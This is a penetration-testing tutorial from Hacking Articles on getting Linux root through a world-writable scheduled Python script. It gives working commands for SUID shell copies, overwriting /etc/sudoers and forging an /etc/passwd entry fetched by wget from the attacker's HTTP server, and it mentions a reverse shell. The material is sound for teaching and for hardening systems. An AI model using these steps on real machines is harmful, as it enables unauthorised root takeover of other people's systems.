@@ -1,0 +1,105 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
+            <h1 class="post-title entry-title">Multiple Ways to Get root through Writable File</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/multiple-ways-to-get-root-through-writable-file/" rel="bookmark"><time class="entry-date published updated" datetime="2018-06-10T17:23:49+00:00">June 10, 2018</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">In Linux, everything is a file, including directories and devices that have permissions to allow or restricted three operations i.e. read/write/execute. When admin set permission for any file, he should be aware of Linux users to whom he is going to allow or restrict all three permissions.</span></p>
+<p><span style="color: #000000;">In this article, we are going to discuss Linux privilege escalation through writable file/script. To know more about Linux system permission to read this<span style="color: #3366ff;"> <a style="color: #3366ff;" href="http://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/">article</a></span>.</span></p>
+<h3><span style="color: #800000;"><strong>Table of content</strong></span></h3>
+<p><span style="color: #000000;">Methods to Escalate root via writable script </span></p>
+<ol>
+<li><span style="color: #000000;">Copy /bin/sh inside /tmp</span></li>
+<li><span style="color: #000000;">Set SUID bit for /bin/dash</span></li>
+<li><span style="color: #000000;">Give ALL permission to logged user through sudoers</span></li>
+<li><span style="color: #000000;">Set SUID bit for /bin/cp</span></li>
+<li><span style="color: #000000;">Malicious code for reverse connection.</span></li>
+</ol>
+<p><span style="color: #000000;"><strong>Let’s start!!!</strong></span></p>
+<p><span style="color: #000000;">Start your attacking machine and first compromise the target system and then move to privilege escalation stage. Suppose I successfully login into victim’s machine through ssh and access non-root user terminal. Then by using the following command, we can enumerate all binaries having writable permission.</span></p>
+<pre class="lang:default decode:true ">find / -writable -type  f 2&gt;/dev/null | grep -v "/proc/"</pre>
+<p><span style="color: #000000;">As you can observe that it has shown a python file which is stored inside /lib/log. When we explored that path we notice<strong> permission 777</strong> for <strong>sanitizer.py</strong></span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-pDr6LDm57yY/Wx1bdZm0puI/AAAAAAAAXWA/iLMhI-fioo0Y199gU6dWixlumQf9Ql0fwCLcBGAs/s1600/10.png"/></span></p>
+<p><span style="color: #000000;">So here the following script was added by admin to clean up all junk file from inside /tmp and these type of files depends upon specific time interval for executions.</span></p>
+<p><span style="color: #000000;">Now if an attack identifies such types of situation in the victim’s machine then he can destroy his system by escalating root privileges in the following ways:</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-7RohEEPViYA/Wx1bdVW2UHI/AAAAAAAAXWE/KvH_h9GOK4wIFxE2JWattgA6Bg1lm79MwCLcBGAs/s1600/11.png"/></span></p>
+<h3><span style="color: #800000;"><strong>1<sup>st</sup> Method</strong></span></h3>
+<p><span style="color: #000000;"><strong> </strong>There so many methods to gain root access as in this method we copied /bin/sh inside /tmp and enabled SUID for /tmp/sh. It is quite simple, first, open the file through some editor for example <strong>n</strong></span><strong style="color: #000000;">ano sanitizer.py</strong>n and replace<strong style="color: #000000;"> “rm -r /tmp/*”</strong><span style="color: #000000;"> from the following line as given below</span></p>
+<pre class="lang:default decode:true">os.system('cp /bin/sh /tmp/sh')
+os.system('chmod u+s /tmp/sh')</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-79dxQMw2ABY/Wx1bdSTcqRI/AAAAAAAAXWI/_c6sAOzaD9EcKV8my9f6m4eZqsmdEJngQCLcBGAs/s1600/13.png"/></span></p>
+<p><span style="color: #000000;">After some time it will create a script file inside /tmp directory with SUID permission and when you will run it, you will give root access.</span></p>
+<pre class="lang:default decode:true">cd /tmp
+ls
+./sh
+id
+whoami</pre>
+<p><span style="color: #000000;">As you can confirm this from given below image.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-GDZM0jX9-Vg/Wx1bd2dVNiI/AAAAAAAAXWM/G6g53pbH5nAoxJaufXSpyHM_ihVCbmh7gCLcBGAs/s1600/14.png"/></span></p>
+<h3><span style="color: #800000;"><strong>2<sup>nd</sup> Method</strong></span></h3>
+<p><span style="color: #000000;">Similarly, you can also replace<strong> “rm -r /tmp/*”</strong> from the following line as given below.</span></p>
+<pre class="lang:default decode:true">os.system('chmod u+s /bin/dash')</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Ecds6shXlAs/Wx1beD6QVdI/AAAAAAAAXWQ/aGM4SJa50_8PKjIXw84zLHqqRAA-MMYuACLcBGAs/s1600/15.png"/></span></p>
+<p><span style="color: #000000;">After some time it will set SUID permission for /bin/dash and when you will run it will give root access.</span></p>
+<pre class="lang:default decode:true">/bin/dash
+id</pre>
+<p><span style="color: #000000;">As you can confirm this from given below image.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-OK2nDW5a_P0/Wx1beMv104I/AAAAAAAAXWU/XFavphBwDEQV1s0Z6S1d8y_yPtIOAxhlgCLcBGAs/s1600/16.png"/></span></p>
+<h3><span style="color: #800000;"><strong>3<sup>rd</sup> Method </strong></span></h3>
+<p><span style="color: #000000;">In this method, we have pasted python reverse shell connection code at the place of <strong>rm -r /tmp/*</strong> and start netcat listener in a new terminal.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-KtQRAdEBG68/Wx1beVTB7kI/AAAAAAAAXWY/XVJIsCSlBAchAGAJ2WpB35YjV4R0lyLgwCLcBGAs/s1600/17.png"/></span></p>
+<p><span style="color: #000000;">And as said above after some time we got the reverse connection through netcat and root access.</span></p>
+<pre class="lang:default decode:true">nc -lvp 1234
+id
+whoami</pre>
+<p><span style="color: #000000;">As you can confirm this from given below image.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-CRI8_FkjQvo/Wx1bes0_xhI/AAAAAAAAXWc/56HZYXYUy8gkS2yCVN0wH3ja8p_XrRLsgCLcBGAs/s1600/18.png"/></span></p>
+<h3><span style="color: #800000;"><strong>4<sup>th</sup> Method </strong></span></h3>
+<p><span style="color: #000000;">Another most interesting method is to give sudo right to the logged users by making him sudoers file member. If you will notice below image then you can ensure that currently user: wernerbrandes may not run sudo command.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zzfeNd1tqJ4/Wx1begtvi_I/AAAAAAAAXWg/KuxeeRnpSHw4-JcBZgVLV4WiBpPFJhOrQCLcBGAs/s1600/19.png"/></span></p>
+<p><span style="color: #000000;">Similarly you can also replace<strong> “rm -r /tmp/*”</strong> from following line as given below.</span></p>
+<pre class="lang:default decode:true">os.system('echo "wernerbrandes ALL=(ALL) NOPASSWD: ALL" &gt; /etc/sudoers')</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-VULIjBiQ0KI/Wx1be5PndUI/AAAAAAAAXWk/HL7I68Dft7kowz2cVmJo_WQdoTdCbdsRACLcBGAs/s1600/20.png"/></span></p>
+<p><span style="color: #000000;">And after some time, when you will type “sudo -l” command then you will notice, it becomes the member of sudo users. To take root access type “sudo bash” and enjoy the root access.</span></p>
+<pre class="lang:default decode:true">sudo -l
+sudo bash
+id</pre>
+<h3><span style="color: #800000;"><strong>5<sup>th</sup> Method </strong></span></h3>
+<p><span style="color: #000000;">As we all know how much important role play by passwd in any Linux like the system and if an attacker gets the chance to modify this file, it becomes a dynamic way of privilege escalation.</span></p>
+<p><span style="color: #000000;">Similarly, we will try something like this BUT with help of the writable script, here by using cat command we can etc/passwd file.</span></p>
+<p><span style="color: #000000;">Here you can observe the highlighted entry for user: nemo records, as per my guessing UID:1000 &amp; GID:1000 indicates it would be a member of admin group.</span></p>
+<p><span style="color: #000000;">However, we want to edit nemo record to make him a member of the root, therefore, select the whole content of etc/passwd and copy it and then paste into empty text file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-1M-Go-j27ns/Wx1bfaXtyNI/AAAAAAAAXWs/tLfWC6Hcqz4qFbZXmt6OUznne236KYomACLcBGAs/s1600/22.png"/></span></p>
+<p><span style="color: #000000;">After then in a new terminal generate a salt password with help of openssl as shown and copy it.</span></p>
+<pre class="lang:default decode:true ">openssl passwd -1 -salt abc 123</pre>
+<p><span style="color: #000000;"><strong> <img decoding="async" src="https://4.bp.blogspot.com/-xYJZmpA7IxE/Wx1bfvBiKyI/AAAAAAAAXWw/Xxnzh6w-JtwXqPuvTn6Cgdee79io_K8SgCLcBGAs/s1600/23.png"/></strong></span></p>
+<p><span style="color: #000000;">Now paste above-copied salt password at the place of “X” in the record entry of user nemo and also change previous UID&amp;GID with <strong>0:0</strong> as shown in the given image. Once above said all steps are completed save the text file as “<strong>passwd</strong>” because when you will transfer this file to victim’s machine it will overwrite the content of the original passwd file.</span></p>
+<pre class="lang:default decode:true">cd Desktop
+python -m SimpleHTTPServer 80</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-RS6Cc5CI688/Wx1bf4a_3xI/AAAAAAAAXW0/T8FQgfx1zVk_OHoDa6JQFw_VJk_Sy1UbgCLcBGAs/s1600/24.png"/></span></p>
+<p><span style="color: #000000;">Now taking advantage of writable script replace<strong> “rm -r /tmp/*”</strong> from the following line as given below.</span></p>
+<pre class="lang:default decode:true">os.system('chmod u+s /bin/cp')</pre>
+<p><span style="color: #000000;">After some time it will enable SUID bit for /bin/cp to copy any file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-KkxRVimuQxk/Wx1bf3Hx6zI/AAAAAAAAXW4/VstowXj8iGYkNLTyKE8fWx1XtJIfG6FhQCLcBGAs/s1600/25.png"/></span></p>
+<p><span style="color: #000000;">Now download your modified passwd file inside /tmp directory of victim’s machine. Let’s check whether SUID bit gets enabled for /bin/cp or not with help of the following command after then copy modify passwd file into /etc/passwd with help of cp command which will overwrite the content of original passwd file.</span></p>
+<pre class="lang:default decode:true">cd /tmp
+wget http://192.168.1.103/passwd
+ls -al /bin/cp
+cp passwd /etc/passwd</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-FSCpOB69mtw/Wx1bgLQwePI/AAAAAAAAXW8/hwfmtVcLFoIyzSnBEsjILVr8xjch4_TegCLcBGAs/s1600/26.png"/></span></p>
+<p><span style="color: #000000;">Now let confirm whether we have successfully manipulated the content of passwd file or not with help of the following command.</span></p>
+<pre class="lang:default decode:true">tail /etc/passwd</pre>
+<p><span style="color: #000000;">Wonderful!!! You can observe the following changes has now become part of the passwd file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-HP6W0BIJoeg/Wx1bgmomILI/AAAAAAAAXXA/7wlnLPfvu4kAZG5TS1buDbLkJV--kOH5ACLcBGAs/s1600/27.png"/></span></p>
+<p><span style="color: #000000;">Now let take root access by executing the following command:</span></p>
+<pre class="lang:default decode:true">su nemo
+password 123
+whoami</pre>
+<p><span style="color: #000000;"><strong> </strong>So today we have demonstrated how an attacker can lead to privilege escalation through the writable file.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-6kDYMny03bM/Wx1bgqMo9dI/AAAAAAAAXXE/rQz6XDOXJzkc4Inhzo7gQ01UUyBzhVMHgCLcBGAs/s1600/28.png"/></span></p>
+<p><span style="color: #000000;"><strong>Author: </strong>AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
